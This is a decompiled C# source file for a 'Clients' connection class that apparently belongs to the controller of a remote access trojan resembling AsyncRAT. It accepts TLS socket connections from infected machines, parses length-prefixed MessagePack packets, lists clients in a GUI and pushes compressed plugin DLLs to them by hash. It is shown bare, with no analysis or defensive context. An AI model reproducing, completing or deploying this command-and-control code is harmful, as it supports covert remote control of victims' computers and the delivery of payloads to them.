﻿using System;
using System.Collections;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Media;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Threading;
using System.Windows.Forms;
using Server.Algorithm;
using Server.Handle_Packet;
using Server.Helper;
using Server.MessagePack;
using Server.Properties;

namespace Server.Connection
{
	// Token: 0x02000027 RID: 39
	public class Clients
	{
		// Token: 0x1700003E RID: 62
		// (get) Token: 0x06000168 RID: 360 RVA: 0x00002766 File Offset: 0x00000966
		// (set) Token: 0x06000169 RID: 361 RVA: 0x0000276E File Offset: 0x0000096E
		public Socket TcpClient { get; set; }

		// Token: 0x1700003F RID: 63
		// (get) Token: 0x0600016A RID: 362 RVA: 0x00002777 File Offset: 0x00000977
		// (set) Token: 0x0600016B RID: 363 RVA: 0x0000277F File Offset: 0x0000097F
		public SslStream SslClient { get; set; }

		// Token: 0x17000040 RID: 64
		// (get) Token: 0x0600016C RID: 364 RVA: 0x00002788 File Offset: 0x00000988
		// (set) Token: 0x0600016D RID: 365 RVA: 0x00002790 File Offset: 0x00000990
		public ListViewItem LV { get; set; }

		// Token: 0x17000041 RID: 65
		// (get) Token: 0x0600016E RID: 366 RVA: 0x00002799 File Offset: 0x00000999
		// (set) Token: 0x0600016F RID: 367 RVA: 0x000027A1 File Offset: 0x000009A1
		public ListViewItem LV2 { get; set; }

		// Token: 0x17000042 RID: 66
		// (get) Token: 0x06000170 RID: 368 RVA: 0x000027AA File Offset: 0x000009AA
		// (set) Token: 0x06000171 RID: 369 RVA: 0x000027B2 File Offset: 0x000009B2
		public string ID { get; set; }

		// Token: 0x17000043 RID: 67
		// (get) Token: 0x06000172 RID: 370 RVA: 0x000027BB File Offset: 0x000009BB
		// (set) Token: 0x06000173 RID: 371 RVA: 0x000027C3 File Offset: 0x000009C3
		private byte[] ClientBuffer { get; set; }

		// Token: 0x17000044 RID: 68
		// (get) Token: 0x06000174 RID: 372 RVA: 0x000027CC File Offset: 0x000009CC
		// (set) Token: 0x06000175 RID: 373 RVA: 0x000027D4 File Offset: 0x000009D4
		private long HeaderSize { get; set; }

		// Token: 0x17000045 RID: 69
		// (get) Token: 0x06000176 RID: 374 RVA: 0x000027DD File Offset: 0x000009DD
		// (set) Token: 0x06000177 RID: 375 RVA: 0x000027E5 File Offset: 0x000009E5
		private long Offset { get; set; }

		// Token: 0x17000046 RID: 70
		// (get) Token: 0x06000178 RID: 376 RVA: 0x000027EE File Offset: 0x000009EE
		// (set) Token: 0x06000179 RID: 377 RVA: 0x000027F6 File Offset: 0x000009F6
		private bool ClientBufferRecevied { get; set; }

		// Token: 0x17000047 RID: 71
		// (get) Token: 0x0600017A RID: 378 RVA: 0x000027FF File Offset: 0x000009FF
		// (set) Token: 0x0600017B RID: 379 RVA: 0x00002807 File Offset: 0x00000A07
		public object SendSync { get; set; }

		// Token: 0x17000048 RID: 72
		// (get) Token: 0x0600017C RID: 380 RVA: 0x00002810 File Offset: 0x00000A10
		// (set) Token: 0x0600017D RID: 381 RVA: 0x00002818 File Offset: 0x00000A18
		public long BytesRecevied { get; set; }

		// Token: 0x17000049 RID: 73
		// (get) Token: 0x0600017E RID: 382 RVA: 0x00002821 File Offset: 0x00000A21
		// (set) Token: 0x0600017F RID: 383 RVA: 0x00002829 File Offset: 0x00000A29
		public string Ip { get; set; }

		// Token: 0x1700004A RID: 74
		// (get) Token: 0x06000180 RID: 384 RVA: 0x00002832 File Offset: 0x00000A32
		// (set) Token: 0x06000181 RID: 385 RVA: 0x0000283A File Offset: 0x00000A3A
		public bool Admin { get; set; }

		// Token: 0x1700004B RID: 75
		// (get) Token: 0x06000182 RID: 386 RVA: 0x00002843 File Offset: 0x00000A43
		// (set) Token: 0x06000183 RID: 387 RVA: 0x0000284B File Offset: 0x00000A4B
		public DateTime LastPing { get; set; }

		// Token: 0x06000184 RID: 388 RVA: 0x00013518 File Offset: 0x00011718
		public Clients(Socket socket)
		{
			this.SendSync = new object();
			this.TcpClient = socket;
			this.Ip = this.TcpClient.RemoteEndPoint.ToString().Split(new char[]
			{
				':'
			})[0];
			this.SslClient = new SslStream(new NetworkStream(this.TcpClient, true), false);
			this.SslClient.BeginAuthenticateAsServer(Settings.ServerCertificate, false, SslProtocols.Tls, false, new AsyncCallback(this.EndAuthenticate), null);
		}

		// Token: 0x06000185 RID: 389 RVA: 0x000135A4 File Offset: 0x000117A4
		private void EndAuthenticate(IAsyncResult ar)
		{
			try
			{
				this.SslClient.EndAuthenticateAsServer(ar);
				this.Offset = 0L;
				this.HeaderSize = 4L;
				this.ClientBuffer = new byte[this.HeaderSize];
				this.SslClient.BeginRead(this.ClientBuffer, (int)this.Offset, (int)this.HeaderSize, new AsyncCallback(this.ReadClientData), null);
			}
			catch
			{
				SslStream sslClient = this.SslClient;
				if (sslClient != null)
				{
					sslClient.Dispose();
				}
				Socket tcpClient = this.TcpClient;
				if (tcpClient != null)
				{
					tcpClient.Dispose();
				}
			}
		}

		// Token: 0x06000186 RID: 390 RVA: 0x00013644 File Offset: 0x00011844
		public void ReadClientData(IAsyncResult ar)
		{
			try
			{
				if (!this.TcpClient.Connected)
				{
					this.Disconnected();
				}
				else
				{
					int num = this.SslClient.EndRead(ar);
					if (num > 0)
					{
						this.HeaderSize -= (long)num;
						this.Offset += (long)num;
						if (!this.ClientBufferRecevied)
						{
							if (this.HeaderSize == 0L)
							{
								this.HeaderSize = (long)BitConverter.ToInt32(this.ClientBuffer, 0);
								if (this.HeaderSize > 0L)
								{
									this.ClientBuffer = new byte[this.HeaderSize];
									this.Offset = 0L;
									this.ClientBufferRecevied = true;
								}
							}
							else if (this.HeaderSize < 0L)
							{
								this.Disconnected();
								return;
							}
						}
						else
						{
							object lockReceivedSendValue = Settings.LockReceivedSendValue;
							lock (lockReceivedSendValue)
							{
								Settings.ReceivedValue += (long)num;
							}
							this.BytesRecevied += (long)num;
							if (this.HeaderSize == 0L)
							{
								ThreadPool.QueueUserWorkItem(new WaitCallback(new Packet
								{
									client = this,
									data = this.ClientBuffer
								}.Read), null);
								this.Offset = 0L;
								this.HeaderSize = 4L;
								this.ClientBuffer = new byte[this.HeaderSize];
								this.ClientBufferRecevied = false;
							}
							else if (this.HeaderSize < 0L)
							{
								this.Disconnected();
								return;
							}
						}
						this.SslClient.BeginRead(this.ClientBuffer, (int)this.Offset, (int)this.HeaderSize, new AsyncCallback(this.ReadClientData), null);
					}
					else
					{
						this.Disconnected();
					}
				}
			}
			catch
			{
				this.Disconnected();
			}
		}

		// Token: 0x06000187 RID: 391 RVA: 0x00013824 File Offset: 0x00011A24
		public void Disconnected()
		{
			if (this.LV != null)
			{
				Program.form1.Invoke(new MethodInvoker(delegate()
				{
					try
					{
						object obj = Settings.LockListviewClients;
						lock (obj)
						{
							this.LV.Remove();
						}
						if (this.LV2 != null)
						{
							obj = Settings.LockListviewThumb;
							lock (obj)
							{
								this.LV2.Remove();
							}
						}
					}
					catch
					{
					}
					new HandleLogs().Addmsg("Client " + this.Ip + " disconnected.", Color.Red);
					if (TimeZoneInfo.Local.Id == "China Standard Time" && Settings.Default.Notification)
					{
						SoundPlayer soundPlayer = new SoundPlayer(Resources.offline);
						soundPlayer.Load();
						soundPlayer.Play();
					}
					foreach (AsyncTask asyncTask in Form1.getTasks.ToList<AsyncTask>())
					{
						asyncTask.doneClient.Remove(this.ID);
					}
				}));
			}
			try
			{
				SslStream sslClient = this.SslClient;
				if (sslClient != null)
				{
					sslClient.Dispose();
				}
				Socket tcpClient = this.TcpClient;
				if (tcpClient != null)
				{
					tcpClient.Dispose();
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000188 RID: 392 RVA: 0x00006A74 File Offset: 0x00004C74
		public bool GetListview(string id)
		{
			using (IEnumerator enumerator = Program.form1.listView4.Items.GetEnumerator())
			{
				while (enumerator.MoveNext())
				{
					if (((ListViewItem)enumerator.Current).ToolTipText == id)
					{
						return true;
					}
				}
			}
			return false;
		}

		// Token: 0x06000189 RID: 393 RVA: 0x00013888 File Offset: 0x00011A88
		public void Send(object msg)
		{
			object sendSync = this.SendSync;
			lock (sendSync)
			{
				try
				{
					if (!this.TcpClient.Connected)
					{
						this.Disconnected();
					}
					else if ((byte[])msg != null)
					{
						byte[] array = (byte[])msg;
						byte[] bytes = BitConverter.GetBytes(array.Length);
						this.TcpClient.Poll(-1, SelectMode.SelectWrite);
						this.SslClient.Write(bytes, 0, bytes.Length);
						object lockReceivedSendValue;
						if (array.Length > 1000000)
						{
							using (MemoryStream memoryStream = new MemoryStream(array))
							{
								memoryStream.Position = 0L;
								byte[] array2 = new byte[50000];
								int num;
								while ((num = memoryStream.Read(array2, 0, array2.Length)) > 0)
								{
									this.TcpClient.Poll(-1, SelectMode.SelectWrite);
									this.SslClient.Write(array2, 0, num);
									lockReceivedSendValue = Settings.LockReceivedSendValue;
									lock (lockReceivedSendValue)
									{
										Settings.SentValue += (long)num;
									}
								}
								goto IL_15B;
							}
						}
						this.TcpClient.Poll(-1, SelectMode.SelectWrite);
						this.SslClient.Write(array, 0, array.Length);
						this.SslClient.Flush();
						lockReceivedSendValue = Settings.LockReceivedSendValue;
						lock (lockReceivedSendValue)
						{
							Settings.SentValue += (long)array.Length;
						}
						IL_15B:;
					}
				}
				catch
				{
					this.Disconnected();
				}
			}
		}

		// Token: 0x0600018A RID: 394 RVA: 0x00013A84 File Offset: 0x00011C84
		public void SendPlugin(string hash)
		{
			try
			{
				foreach (string text in Directory.GetFiles("Plugins", "*.dll", SearchOption.TopDirectoryOnly))
				{
					if (hash == GetHash.GetChecksum(text))
					{
						MsgPack msgPack = new MsgPack();
						msgPack.ForcePathObject("Pac_ket").SetAsString("save_Plugin");
						msgPack.ForcePathObject("Dll").SetAsBytes(Zip.Compress(File.ReadAllBytes(text)));
						msgPack.ForcePathObject("Hash").SetAsString(GetHash.GetChecksum(text));
						ThreadPool.QueueUserWorkItem(new WaitCallback(this.Send), msgPack.Encode2Bytes());
						new HandleLogs().Addmsg("Plugin " + Path.GetFileName(text) + " Sent to " + this.Ip, Color.Blue);
						break;
					}
				}
			}
			catch (Exception ex)
			{
				new HandleLogs().Addmsg("Clinet " + this.Ip + " " + ex.Message, Color.Red);
			}
		}
	}
}
